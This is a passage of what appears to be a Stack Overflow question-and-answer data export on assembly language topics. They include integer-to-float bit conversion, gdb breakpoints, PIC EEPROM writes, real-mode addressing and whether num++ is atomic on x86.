<p>So the value is 1.0 x 2<sup>1</sup> = 2.0.  </p>

<p>To convert an <code>unsigned int</code> in the limited range given above, then, to something in IEEE-754 format, you might use a function like the one below.  It takes the following steps:</p>

<ul>
<li>Aligns the leading 1 of the integer to the position of the <em>hidden</em> 1 in the floating point representation.</li>
<li>While aligning the integer, records the total number of shifts made. </li>
<li>Masks away the hidden 1.</li>
<li>Using the number of shifts made, computes the exponent and appends it to the number.</li>
<li>Using <code>reinterpret_cast</code>, converts the resulting bit-pattern to a <code>float</code>.  This part is an ugly hack, because it uses a type-punned pointer.  You could also do this by abusing a <code>union</code>.  Some platforms provide an intrinsic operation (such as <code>_itof</code>) to make this reinterpretation less ugly.</li>
</ul>

<p>There are much faster ways to do this; this one is meant to be pedagogically useful, if not super efficient:</p>

<pre><code>float uint_to_float(unsigned int significand)
{
    // Only support 0 &lt; significand &lt; 1 &lt;&lt; 24.
    if (significand == 0 || significand &gt;= 1 &lt;&lt; 24)
        return -1.0;  // or abort(); or whatever you'd like here.

    int shifts = 0;

    //  Align the leading 1 of the significand to the hidden-1 
    //  position.  Count the number of shifts required.
    while ((significand &amp; (1 &lt;&lt; 23)) == 0)
    {
        significand &lt;&lt;= 1;
        shifts++;
    }

    //  The number 1.0 has an exponent of 0, and would need to be
    //  shifted left 23 times.  The number 2.0, however, has an
    //  exponent of 1 and needs to be shifted left only 22 times.
    //  Therefore, the exponent should be (23 - shifts).  IEEE-754
    //  format requires a bias of 127, though, so the exponent field
    //  is given by the following expression:
    unsigned int exponent = 127 + 23 - shifts;

    //  Now merge significand and exponent.  Be sure to strip away
    //  the hidden 1 in the significand.
    unsigned int merged = (exponent &lt;&lt; 23) | (significand &amp; 0x7FFFFF);


    //  Reinterpret as a float and return.  This is an evil hack.
    return *reinterpret_cast&lt; float* &gt;( &amp;merged );
}
</code></pre>

<p>You can make this process more efficient using functions that detect the leading 1 in a number.  (These sometimes go by names like <code>clz</code> for ""count leading zeros"", or <code>norm</code> for ""normalize"".)</p>

<p>You can also extend this to signed numbers by recording the sign, taking the absolute value of the integer, performing the steps above, and then putting the sign into bit 31 of the number.</p>

<p>For integers >= 2<Sup>24</Sup>, the entire integer does not fit into the significand field of the 32-bit float format.  This is why you need to ""round"":  You lose LSBs in order to make the value fit.  Thus, multiple integers will end up mapping to the same floating point pattern.  The exact mapping depends on the rounding mode (round toward -Inf, round toward +Inf, round toward zero, round toward nearest even).  But the fact of the matter is you can't shove 24 bits into fewer than 24 bits without some loss.</p>

<p>You can see this in terms of the code above.  It works by aligning the leading 1 to the hidden 1 position.  If a value was >= 2<sup>24</sup>, the code would need to shift <em>right</em>, not <em>left</em>, and that necessarily shifts LSBs away.  Rounding modes just tell you how to handle the bits shifted away.</p>
","20308114"
"CMP in assembly language","9271","","<p>So I have this line of code:</p>

<pre><code>LOOP CMP Y, #0
BEQ DONE - When it is equal go to DONE.
ADD X, #1 - add decimal constant 1 to x.
SUB Y, #1 - subtract decimal constant 1 from y
B LOOP - branch loop (start the loop again)
DONE ...
</code></pre>

<p>I just read that CMP means subtracting the operand from Rn (Y minus 0)
And that CMN means adding the operand to the Rn (0 + Y for example)</p>

<p>The first line (LOOP CMP Y, #0): I thought this just compares Y with the number 0. Is this true?</p>
","<p>Yes -- <code>cmp</code> (at least in most assembly languages) does a subtraction. It sets the flags based on the result of that subtraction, but then throws away the result itself.</p>
","11551399"
"How to generate assembly code from C++ source in Visual Studio 2010","9263","","<p>I want to generate assembly code from C++ source code using Microsoft VC++ Compiler. I want to do this in the command line itself. Not from the IDE.</p>

<p>What're the commands/options?</p>
","<p>I believe this is what the <a href=""http://msdn.microsoft.com/en-us/library/367y26c6.aspx"">/FA switch</a> is for.</p>
","4499263"
"How to put a break on an instruction specified by address in gdb?","9251","","<p>How can I put a break point to that instruction. When I write either:</p>

<pre><code>break 9048f23
break *9048f23
</code></pre>

<p>It does not work.</p>

<p>How I can put a break point to that instruction.</p>

<pre><code>9048f23:    8a 51 e6                mov    0x12(%esp),%eax  
</code></pre>

<p>Platform: Linux.</p>
","<p>You just need to add the hex prefix:</p>

<pre><code>b *0x9048f23
</code></pre>
","7878308"
"easy way to get opcodes","9243","","<p>I know how to get the opcodes and the corresponding assembly syntax from an executable; however is there an easy way to get the opcodes of a particular assembly instruction alone, without writing a program using the same and then, manually linking and loading it and doing an objdump on the executable?</p>

<p>Is there a simple way to find the corresponding opcodes of a particular instruction?</p>
","<p>You can use gdb's (GNU Debugger's) x/bx command.</p>

<p>I made a tutorial here:<br /></p>

<del>
http://aimbots.net/tutorials/9276-how-get-op-codes.html
</del>

<p><a href=""http://aimbots.net/threads/9276-How-to-get-OP-codes"" rel=""nofollow"">http://aimbots.net/threads/9276-How-to-get-OP-codes</a></p>
","4774865"
"Writing to EEPROM on PIC","9241","","<p>Are there any PIC microcontroller programmers here?</p>

<p>I'm learning some PIC microcontroller programming using a pickit2 and the 16F690 chip that came with it. I'm working through trying out the various facilities at the moment. I can sucessfully <strong>read</strong> a byte from the EEPROM in code if I set the EEPROM vaklue in MPLAB but I don't seem to be able to modify the value using the PIC itsself. Simply nothing happens and I don't read back the modified value, I always get the original which implies to me that the write isn't working?</p>

<p>This is my code for that section, am I missing something? I know I'm doing a lot of unnecessary bank switches, I added most of them to ensure that being on the wrong bank wasn't the issue.</p>

<pre><code>        ; ------------------------------------------------------
        ; Now SET the EEPROM location ZERO to 0x08
        ; ------------------------------------------------------

        BANKSEL EEADR
        CLRF    EEADR           ; Set EE Address to zero

        BANKSEL EEDAT
        MOVLW   0x08            ; Store the value 0x08 in the EEPROM
        MOVWF   EEDAT

        BANKSEL EECON1
        BSF     EECON1, WREN    ; Enable writes to the EEPROM

        BANKSEL EECON2
        MOVLW   0x55            ; Do the thing we have to do so
        MOVWF   EECON2          ; that writes can work
        MOVLW   0xAA
        MOVWF   EECON2

        BANKSEL EECON1      
        BSF     EECON1, WR      ; And finally perform the write

WAIT
        BTFSC   EECON1, WR      ; Wait for write to finish
        GOTO    WAIT

        BANKSEL PORTC           ; Just to make sure we are on the right bank
</code></pre>
","<p>On page 122 of the <a href=""http://www.microchip.com/wwwproducts/Devices.aspx?dDocName=en023112"" rel=""nofollow noreferrer"">16F690 datasheet</a>, it details the proper way to write to EEPROM:</p>

<blockquote>
<pre><code>BANKSEL EEADR                   ;
MOVF    DATA_EE_ADDR, W;
MOVWF   EEADR          ;Data Memory Address to write
MOVF    DATA_EE_DATA, W;
MOVWF   EEDAT                   ;Data Memory Value to write
BANKSEL EECON1                  ;
BCF     EECON1, EEPGD ;Point to DATA memory
BSF     EECON1, WREN   ;Enable writes
BCF     INTCON, GIE             ;Disable INTs.
BTFSC   INTCON, GIE             ;SEE AN576
GOTO    $-2
; BEGIN REQUIRED SEQUENCE
MOVLW   55h            ;       
MOVWF   EECON2         ;Write 55h
MOVLW   AAh                     ;
MOVWF   EECON2                  ;Write AAh
BSF     EECON1, WR              ;Set WR bit to begin write
BSF     INTCON, GIE             ;Enable INTs.
SLEEP                  ;Wait for interrupt to signal write complete
; END REQUIRED SEQUENCE
BCF     EECON1, WREN   ;Disable writes
BANKSEL 0x00           ;Bank 0
</code></pre>
</blockquote>

<p>I noticed that you are specifically missing this line:</p>

<pre><code> BCF     EECON1, EEPGD ;Point to DATA memory
</code></pre>

<p>If <code>EEPGD</code> is always set, then you'll try to write to program memory (aka overwrite the flash program memory) which should always fail unless you've gone out of your way to specifically enable that.</p>

<p>Aside from that, as far as I can tell from reading your code, everything else looks fine.  It's okay that you're polling <code>EECON1.WR</code> instead of setting an interrupt.  It will cost you more power than putting the device to sleep, but of course you should just worry about one thing at a time.</p>
","2661864"
"Where can I find tools for learning assembler on OS X?","9235","","<p>I'd like to learn assembler.  However, there are very few resources for doing assembler with OS X.</p>

<p>Is there anyone out there who has programmed in assembly on a Mac?  Where did you learn?</p>

<p>And, is there any reason I shouldn't be doing assembly?  Do I risk (significantly) crashing my computer irreparably?</p>
","<p>If you're using a PowerPC Mac, look into gcc inline assembler.  Otherwise, look into nasm.   I can't give any decent references to PPC ASM (they're few and far between), but I suggest the following things to learn x86 asm:</p>

<ul>
<li>The book <a href=""http://rads.stackoverflow.com/amzn/click/0764574817"" rel=""nofollow noreferrer"">Reversing by Eldad Eilam</a></li>
<li>Compile simple C source with gcc -S and read the assembly generated</li>
<li>Use <a href=""http://sandpile.org/"" rel=""nofollow noreferrer"">Sandpile</a></li>
<li>Join #openrce on irc.freenode.net and use <a href=""http://openrce.org/"" rel=""nofollow noreferrer"">OpenRCE</a></li>
</ul>

<p>Also, if you're not in kernel mode then there's no chance of screwing anything up, really, and even if you are in kernel mode it's hard to really destroy anything.</p>

<p>Edit:  Also, get gcc and such from XCode not Macports or somesuch.  You're in for a world of malformed Mach-O files if you don't.  Not fun to diagnose file format issues when you're just starting asm hacking.</p>
","137542"
"What are the segment and offset in real mode memory addressing?","9234","","<p>I am reading about memory addressing. I read about segment offset and then about descriptor offset. I know how to calculate the exact addresses in real mode. all this is ok, but I am unable to understand what exactly offset is?? Everywhere I read :</p>

<pre><code> In real mode, the registers are only 16 bits, so you can only address up to 64k.
 In order to allow addressing of more memory, addressקד are calculated from 
 segment * 16 + offset.
</code></pre>

<p>Here I can understand the first line. We have 16 bits, so we can address up to 2^16 = 64k.
but what is this second line? what the segment represent? why we multiply it with 16? why we add offset. I just can't understand what this off set is? Can anybody explain me or give me link for this please?</p>
","<p>Under x86 Real-Mode Memory the physical address is 20 bit long and is  calcolated:</p>

<pre><code>PhysicalAddress = Segment * 16 + Offset
</code></pre>

<p>Check also: <a href=""http://www.internals.com/articles/protmode/realmode.htm"" rel=""noreferrer"">Real-Mode Memory Management</a> </p>
","4119555"
"Memory mapped I/O vs Port mapped I/O","9233","","<p>Memory mapped I/O is a technique which allows the use of central memory (RAM) to communicate with peripherals. Port mapped I/O uses ports (with special assembly instructions) to communicate over digital ports.</p>

<p>What are the advantages of one method with respect to another?</p>
","<p>As Cthulhu said, </p>

<ul>
<li>memory mapped I/O allows writing/reading to I/O device ports the same as reading/writing to normal memory (using the same machine code/asm)</li>
</ul>

<p>but there is a disadvantage: </p>

<ul>
<li>you use up physical memory address space for your memory mapped I/O devices (think of 32 bit Windows not being able to access all 4G of RAM on a PC)</li>
</ul>

<p>So an advantage of using the port mapped I/O method is that you have a separate address space for your I/O devices and you can use the whole memory addressing range to access memory.</p>

<p>EDIT: Here is a more complete answer to your question: <a href=""https://stackoverflow.com/questions/4333849/what-real-platforms-map-hardware-ports-to-memory-addresses?rq=1"">hardware ports to memory addresses</a></p>
","15372318"
"What does this line of assembly do?","9223","","<p>I have this line of assembly:</p>

<pre><code>cmpb   $0x0,(%rax,%rcx,1)
</code></pre>

<p>Now, according to the references out there, <code>cmpb</code> does an immediate compare of two bytes. So it compares 0 with <code>(%rax,%rcx,1)</code>. Can somebody explain what this second argument is / does?</p>

<p>Thanks!</p>
","<p>This is the AT&amp;T syntax for</p>

<pre><code>cmp BYTE PTR [rax+rcx*1], 0
</code></pre>

<p>So it computes the address using <code>rax + rcx</code>, dereference it to obtain a <b>b</b>yte, and then  <b>c</b>o<b>mp</b>are it with the number 0.</p>
","8551000"
"Can num++ be atomic for 'int num'?","9220","","<p>In general, for <code>int num</code>, <code>num++</code> (or <code>++num</code>), as a read-modify-write operation, is <strong>not atomic</strong>. But I often see compilers, for example <a href=""https://en.wikipedia.org/wiki/GNU_Compiler_Collection"" rel=""noreferrer"">GCC</a>, generate the following code for it (<a href=""https://godbolt.org/g/UFKEvp"" rel=""noreferrer"">try here</a>):</p>

<p><a href=""https://i.stack.imgur.com/cZMqP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/cZMqP.png"" alt=""Enter image description here""></a></p>

<p>Since line 5, which corresponds to <code>num++</code> is one instruction, can we conclude that <code>num++</code> <strong>is atomic</strong> in this case?</p>

<p>And if so, <strong>does it mean that so-generated <code>num++</code> can be used in concurrent (multi-threaded) scenarios without any danger of data races</strong> (i.e. we don't need to make it, for example, <code>std::atomic&lt;int&gt;</code> and impose the associated costs, since it's atomic anyway)?</p>

<p><strong>UPDATE</strong></p>

<p>Notice that this question is <em>not</em> whether increment <em>is</em> atomic (it's not and that was and is the opening line of the question). It's whether it <em>can</em> be in particular scenarios, i.e. whether one-instruction nature can in certain cases be exploited to avoid the overhead of the <code>lock</code> prefix. And, as the accepted answer mentions in the section about uniprocessor machines, as well as <a href=""https://stackoverflow.com/a/39414316/4973224"">this answer</a>, the conversation in its comments and others explain, <strong>it can</strong> (although not with C or C++).</p>
","<p>This is absolutely what C++ defines as a Data Race that causes Undefined Behaviour, even if one compiler happened to produce code that did what you hoped on some target machine. You need to use <code>std::atomic</code> for reliable results, but you can use it with <code>memory_order_relaxed</code> if you don't care about reordering.  See below for some example code and asm output using <code>fetch_add</code>.</p>

<hr>

<p>But first, the assembly language part of the question:</p>

<blockquote>
  <p>Since num++ is one instruction (<code>add dword [num], 1</code>), can we conclude that num++ is atomic in this case?</p>
</blockquote>

<p><strong>Memory-destination instructions (other than pure stores) are read-modify-write operations that happen in multiple internal steps</strong>. No architectural register is modified, but the CPU has to hold the data internally while it sends it through its <a href=""https://en.wikipedia.org/wiki/Arithmetic_logic_unit"" rel=""noreferrer"">ALU</a>. The actual register file is only a small part of the data storage inside even the simplest CPU, with latches holding outputs of one stage as inputs for another stage, etc., etc.</p>

<p>Memory operations from other CPUs can become globally visible between the load and store. I.e. two threads running <code>add dword [num], 1</code> in a loop would step on each other's stores. (See <a href=""https://stackoverflow.com/questions/39393850/can-num-be-atomic-for-an-int-num/39394630#39394630"">@Margaret's answer</a> for a nice diagram). After 40k increments from each of two threads, the counter might have only gone up by ~60k (not 80k) on real multi-core x86 hardware.</p>

<hr>

<p><strong>""Atomic"", from the Greek word meaning indivisible, means that no observer can <em>see</em> the operation as separate steps.  Happening physically / electrically instantaneously for all bits simultaneously is just one way to achieve this for a load or store, but that's not even possible for an ALU operation.</strong> I went into a lot more detail about pure loads and pure stores in my answer to <em><a href=""https://stackoverflow.com/questions/38447226/atomicity-on-x86/38465341#38465341"">Atomicity on x86</a></em>, while this answer focuses on read-modify-write.</p>

<p>The <a href=""http://www.felixcloutier.com/x86/LOCK.html"" rel=""noreferrer""><code>lock</code> prefix</a> can be applied to many read-modify-write (memory destination) instructions to make the entire operation atomic with respect to all possible observers in the system (other cores and DMA devices, not an oscilloscope hooked up to the CPU pins). That is why it exists.  (See also <a href=""https://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly/8891781#8891781"">this Q&amp;A</a>).</p>

<p><strong>So <code>lock add dword [num], 1</code> <em>is</em> atomic</strong>. A CPU core running that instruction would keep the cache line pinned in Modified state in its private L1 cache from when the load reads data from cache until the store commits its result back into cache.  This prevents any other cache in the system from having a copy of the cache line at any point from load to store, according to the rules of the <a href=""https://en.wikipedia.org/wiki/MESI_protocol"" rel=""noreferrer"">MESI cache coherency protocol</a> (or the MOESI/MESIF versions of it used by multi-core AMD/Intel CPUs, respectively).  Thus, operations by other cores appear to happen either before or after, not during.</p>

<p>Without the <code>lock</code> prefix, another core could take ownership of the cache line and modify it after our load but before our store, so that other store would become globally visible in between our load and store.  Several other answers get this wrong, and claim that without <code>lock</code> you'd get conflicting copies of the same cache line.  This can never happen in a system with coherent caches.</p>

<p>(If a <code>lock</code>ed instruction operates on memory that spans two cache lines, it takes a lot more work to make sure the changes to both parts of the object stay atomic as they propagate to all observers, so no observer can see tearing.  The CPU might have to lock the whole memory bus until the data hits memory.  Don't misalign your atomic variables!)</p>

<p>Note that the <code>lock</code> prefix also turns an instruction into a full memory barrier (like <a href=""http://www.felixcloutier.com/x86/MFENCE.html"" rel=""noreferrer"">MFENCE</a>), stopping all run-time reordering and thus giving sequential consistency.  (See <a href=""http://preshing.com/20120710/memory-barriers-are-like-source-control-operations/"" rel=""noreferrer"">Jeff Preshing's excellent blog post</a>. His other posts are all excellent, too, and clearly explain a <em>lot</em> of good stuff about <a href=""http://preshing.com/20120612/an-introduction-to-lock-free-programming/"" rel=""noreferrer"">lock-free programming</a>, from x86 and other hardware details to C++ rules.)</p>

<hr>

<p><strong>On a uniprocessor machine, or in a single-threaded process</strong>, a single <a href=""https://en.wikipedia.org/wiki/Read-modify-write"" rel=""noreferrer"">RMW</a> instruction actually <em>is</em> atomic without a <code>lock</code> prefix. The only way for other code to access the shared variable is for the CPU to do a context switch, which can't happen in the middle of an instruction. So a plain <code>dec dword [num]</code> can synchronize between a single-threaded program and its signal handlers, or in a multi-threaded program running on a single-core machine. See <a href=""https://stackoverflow.com/a/39358907/224132"">the second half of my answer on another question</a>, and the comments under it, where I explain this in more detail.</p>

<hr>

<h3>Back to C++:</h3>

<p>It's totally bogus to use <code>num++</code> without telling the compiler that you need it to compile to a single read-modify-write implementation:</p>

<pre><code>;; Valid compiler output for num++
mov   eax, [num]
inc   eax
mov   [num], eax
</code></pre>

<p>This is very likely if you use the value of <code>num</code> later: the compiler will keep it live in a register after the increment.  So even if you check how <code>num++</code> compiles on its own, changing the surrounding code can affect it.</p>

<p>(If the value isn't needed later, <code>inc dword [num]</code> is preferred; modern x86 CPUs will run a memory-destination RMW instruction at least as efficiently as using three separate instructions.  Fun fact: <a href=""http://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,options:(compileOnChange:&#39;0&#39;),source:&#39;int+a%3B%0Avoid+func()%7B+%2B%2Ba%3B+%7D&#39;),l:&#39;5&#39;,n:&#39;1&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:50,l:&#39;4&#39;,m:100,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((g:!((h:compiler,i:(compiler:g62,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-xc+-Wall+-Wextra+-O3+-m32+-mtune%3Di586+-fomit-frame-pointer+-fverbose-asm&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+6.2&#39;,t:&#39;0&#39;)),k:50,l:&#39;4&#39;,m:84.06862745098039,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:output,i:(compiler:1,editor:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+6.2&#39;,t:&#39;0&#39;)),l:&#39;4&#39;,m:15.931372549019606,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),k:50,l:&#39;3&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4"" rel=""noreferrer""><code>gcc -O3 -m32 -mtune=i586</code> will actually emit this</a>, because (Pentium) P5's superscalar pipeline didn't decode complex instructions to multiple simple micro-operations the way P6 and later microarchitectures do.  See the <a href=""http://agner.org/optimize/"" rel=""noreferrer"">Agner Fog's instruction tables / microarchitecture guide</a> for more info, and the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki for many useful links (including Intel's x86 ISA manuals, which are freely available as PDF)).</p>

<hr>

<h3>Don't confuse the target memory model (x86) with the C++ memory model</h3>

<p><strong><a href=""http://preshing.com/20120625/memory-ordering-at-compile-time/"" rel=""noreferrer"">Compile-time reordering</a> is allowed</strong>. The other part of what you get with std::atomic is control over compile-time reordering, to make sure your <code>num++</code> becomes globally visible only after some other operation.</p>

<p>Classic example: Storing some data into a buffer for another thread to look at, then setting a flag. Even though x86 does acquire loads/release stores for free, you still have to tell the compiler not to reorder by using <code>flag.store(1, std::memory_order_release);</code>.</p>

<p>You might be expecting that this code will synchronize with other threads:</p>

<pre><code>// flag is just a plain int global, not std::atomic&lt;int&gt;.
flag--;       // This isn't a real lock, but pretend it's somehow meaningful.
modify_a_data_structure(&amp;foo);    // doesn't look at flag, and the compilers knows this.  (Assume it can see the function def).  Otherwise the usual don't-break-single-threaded-code rules come into play!
flag++;
</code></pre>

<p>But it won't. The compiler is free to move the <code>flag++</code> across the function call (if it inlines the function or knows that it doesn't look at <code>flag</code>). Then it can optimize away the modification entirely, because <code>flag</code> isn't even <code>volatile</code>. (And no, C++ <code>volatile</code> is not a useful substitute for std::atomic.  std::atomic does make the compiler assume that values in memory can be modified asynchronously similar to <code>volatile</code>, but there's much more to it than that.  Also, <code>volatile std::atomic&lt;int&gt; foo</code> is not the same as <code>std::atomic&lt;int&gt; foo</code>, as discussed with @Richard Hodges.)</p>

<p>Defining data races on non-atomic variables as Undefined Behaviour is what lets the compiler still hoist loads and sink stores out of loops, and many other optimizations for memory that multiple threads might have a reference to.  (See <a href=""http://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html"" rel=""noreferrer"">this LLVM blog</a> for more about how UB enables compiler optimizations.)</p>

<hr>

<p>As I mentioned, the <a href=""http://www.felixcloutier.com/x86/LOCK.html"" rel=""noreferrer"">x86 <code>lock</code> prefix</a> is a full memory barrier, so using <code>num.fetch_add(1, std::memory_order_relaxed);</code> generates the same code on x86 as <code>num++</code> (the default is sequential consistency), but it can be much more efficient on other architectures (like ARM).  Even on x86, relaxed allows more compile-time reordering.</p>

<p><strong>This is what GCC actually does on x86, for a few functions that operate on a <code>std::atomic</code> global variable.</strong></p>

<p>See the source + assembly language code formatted nicely on the <a href=""http://gcc.godbolt.org/#compilers:!((compiler:g62,options:&#39;-std%3Dgnu%2B%2B11+-Wall+-Wextra++-O3&#39;,sourcez:MQSwdgxgNgrgJgUwAQB4CGAXA9gWxBAPgCgiBnDOALks13xXAwKTBhwG4SA3LEOJcBAD6AJwRQ0ADwRwAFAEokAbyJIWbAHQAzBBggALIWjhyAjABok5KpRwIcWEQE8hjxCNHipM%2BZwC%2BJEQ8fAKQQqQIAI5CEOQKyqrqOADUyexqAPQZSNq6BkYmshZWFNR2Ds6uIu7hUTHkvkQBRIxIUFjGQqw48UpIYhgwImBJ6X5qE5NTWUgIXAgjEdGxGG0dcKRIaGJIWmLIWCOSABwAbEG8/OSOCF1ssq1caFDyfd1IALxIT1BjFyHXMR3HCeKAINARB5gVY/V6JGbPdoAdxkSGwSAARshEBInKjwJiEBA6GAAOZIUntDGIpzfECkEAYsFIGDQkBQLZaDAIES7LBQZHgclYAAOpA0iW6GkBCFkP0s1jK9kcLjcPNB4IijQCwSu2CB3VB3jkj2ecMy2VoeAglgxMFWKLQAGsoLS1WI4Bo1LJiTgRezkBgQHYtmB%2BCJWWjgwh5JLNDK5c8FaVbMrKu6jdI4NqSDMnFgYAByfgISQiomrX3%2BsEiTbo30Y8DIHAwKBBkXMiBoSDiKBCpCinmYECHTaMLBbKxC5miogzLFdmARFhYDD6fukmDbbvchB1/SYUMDjERETzXnE1tXBCB/TIRg8uxwECYZA/GAIOfZEAaBBetcHNUPL9kid47GAq7rmShK%2BnuFJUjSdIMkyyBYhgKILGid7LqKY6bIcyAilgpDIcyYikK2GBflYE4AUgVYBrypD6AWUD8P6EBOgIqyHgxzJBnYubZAAQvaK4YlgcBOIWmxIiIIAYNyIx0VWfZdty/DEogWGHkirH8IiWBIlhyB8TyaITnAtEHqspBoDoroSjMSIKSxYlzOZdgiKS/YEl2ESyWB962W5bFgIWqwHvMTnZAAypZhwRYS9EQluHIEvmQwsjhWhbNg1qkJQJm0tsCxJQY4IiqG/BWeFqyigJIAAF7NjABj/PwLZtiAHa3LhtTLHEio0Pl9CsgypJgPi0IEAAZEksYqBaSSfEgAAMnBqN0qSbUgAC0e3dLt7zJF8pzHWw%2B0fAArLtWQHUdTTcJcSBde2YKuGKmYyLIw1WmNYATVN/CMHNC1EEtSAzO8XwbXGOC5HohjGHISDFMN5QqlUNRiBIWaNFtmg6EjBRyHt6Mppj6ZAR4uPGgTSSI/kKOyEgpzJjYVOqjT33ZhdCPE8zhR7ddHNKhU3M414%2BN3RkUqC8jwsU5zaaS%2BqdMy09QAA)),filterAsm:(commentOnly:!t,directives:!t,intel:!t,labels:!t),version:3"" rel=""noreferrer"">Godbolt compiler explorer</a>. You can select other target architectures, including ARM, MIPS, and PowerPC, to see what kind of assembly language code you get from atomics for those targets.</p>

<pre><code>#include &lt;atomic&gt;
std::atomic&lt;int&gt; num;
void inc_relaxed() {
  num.fetch_add(1, std::memory_order_relaxed);
}

int load_num() { return num; }            // Even seq_cst loads are free on x86
void store_num(int val){ num = val; }
void store_num_release(int val){
  num.store(val, std::memory_order_release);
}
// Can the compiler collapse multiple atomic operations into one? No, it can't.
</code></pre>

<p></p>

<pre><code># g++ 6.2 -O3, targeting x86-64 System V calling convention. (First argument in edi/rdi)
inc_relaxed():
    lock add        DWORD PTR num[rip], 1      #### Even relaxed RMWs need a lock. There's no way to request just a single-instruction RMW with no lock, for synchronizing between a program and signal handler for example. :/ There is atomic_signal_fence for ordering, but nothing for RMW.
    ret
inc_seq_cst():
    lock add        DWORD PTR num[rip], 1
    ret
load_num():
    mov     eax, DWORD PTR num[rip]
    ret
store_num(int):
    mov     DWORD PTR num[rip], edi
    mfence                          ##### seq_cst stores need an mfence
    ret
store_num_release(int):
    mov     DWORD PTR num[rip], edi
    ret                             ##### Release and weaker doesn't.
store_num_relaxed(int):
    mov     DWORD PTR num[rip], edi
    ret
</code></pre>

<p>Notice how MFENCE (a full barrier) is needed after a sequential-consistency stores. x86 is strongly ordered in general, but StoreLoad reordering is allowed. Having a store buffer is essential for good performance on a pipelined out-of-order CPU. Jeff Preshing's <strong><a href=""http://preshing.com/20120515/memory-reordering-caught-in-the-act/"" rel=""noreferrer"">Memory Reordering Caught in the Act</a></strong> shows the consequences of <em>not</em> using MFENCE, with real code to show reordering happening on real hardware.</p>

<hr>

<p>Re: discussion in comments on @Richard Hodges' answer about <strong>compilers merging std::atomic <code>num++; num-=2;</code> operations into one <code>num--;</code> instruction</strong>:</p>

<p>Current compilers don't actually do this (yet), but not because they aren't allowed to.  <strong><a href=""http://wg21.link/p0062"" rel=""noreferrer"">C++ WG21/P0062R1: When should compilers optimize atomics?</a></strong> discusses the expectation that many programmers have that compilers won't make ""surprising"" optimizations, and what the standard can do to give programmers control.  <a href=""http://wg21.link/n4455"" rel=""noreferrer"">N4455</a> discusses many examples of things that can be optimized, including this one.  It points out that inlining and constant-propagation can introduce things like <code>fetch_or(0)</code> which may be able to turn into just a <code>load()</code> (but still has acquire and release semantics), even when the original source didn't have any obviously redundant atomic ops.</p>

<p>The real reasons compilers don't do it (yet) are: (1) nobody's written the complicated code that would allow the compiler to do that safely (without ever getting it wrong), and (2) it potentially violates the <a href=""https://en.wikipedia.org/wiki/Principle_of_least_astonishment"" rel=""noreferrer"">principle of least surprise</a>.  Lock-free code is hard enough to write correctly in the first place.  So don't be casual in your use of atomic weapons: they aren't cheap and don't optimize much.  It's not always easy easy to avoid redundant atomic operations with <code>std::shared_ptr&lt;T&gt;</code>, though, since there's no non-atomic version of it (although <a href=""https://stackoverflow.com/questions/15129263/is-there-a-non-atomic-equivalent-of-stdshared-ptr-and-why-isnt-there-one-in"">one of the answers here</a> gives an easy way to define a <code>shared_ptr_unsynchronized&lt;T&gt;</code> for gcc).</p>

<hr>

<p>Getting back to <code>num++; num-=2;</code> compiling as if it were <code>num--</code>: 
Compilers <em>are allowed</em> to do this, unless <code>num</code> is <code>volatile std::atomic&lt;int&gt;</code>.  If a reordering is possible, the as-if rule allows the compiler to decide at compile time that it <em>always</em> happens that way.  Nothing guarantees that an observer could see the intermediate values (the <code>num++</code> result).</p>

<p>I.e. if the ordering where nothing becomes globally visible between these operations is compatible with the ordering requirements of the source
 (according to the C++ rules for the abstract machine, not the target architecture), the compiler can emit a single <code>lock dec dword [num]</code> instead of <code>lock inc dword [num]</code> / <code>lock sub dword [num], 2</code>.</p>

<p><code>num++; num--</code> can't disappear, because it still has a Synchronizes With relationship with other threads that look at <code>num</code>, and it's both an acquire-load and a release-store which disallows reordering of other operations in this thread.  For x86, this might be able to compile to an MFENCE, instead of a <code>lock add dword [num], 0</code> (i.e. <code>num += 0</code>).</p>

<p>As discussed in <a href=""http://wg21.link/p0062"" rel=""noreferrer"">PR0062</a>, more aggressive merging of non-adjacent atomic ops at compile time can be bad (e.g. a progress counter only gets updated once at the end instead of every iteration), but it can also help performance without downsides (e.g. skipping the atomic inc / dec of ref counts when a copy of a <code>shared_ptr</code> is created and destroyed, if the compiler can prove that another <code>shared_ptr</code> object exists for entire lifespan of the temporary.)</p>

<p>Even <code>num++; num--</code> merging could hurt fairness of a lock implementation when one thread unlocks and re-locks right away.  If it's never actually released in the asm, even hardware arbitration mechanisms won't give another thread a chance to grab the lock at that point.</p>

<hr>

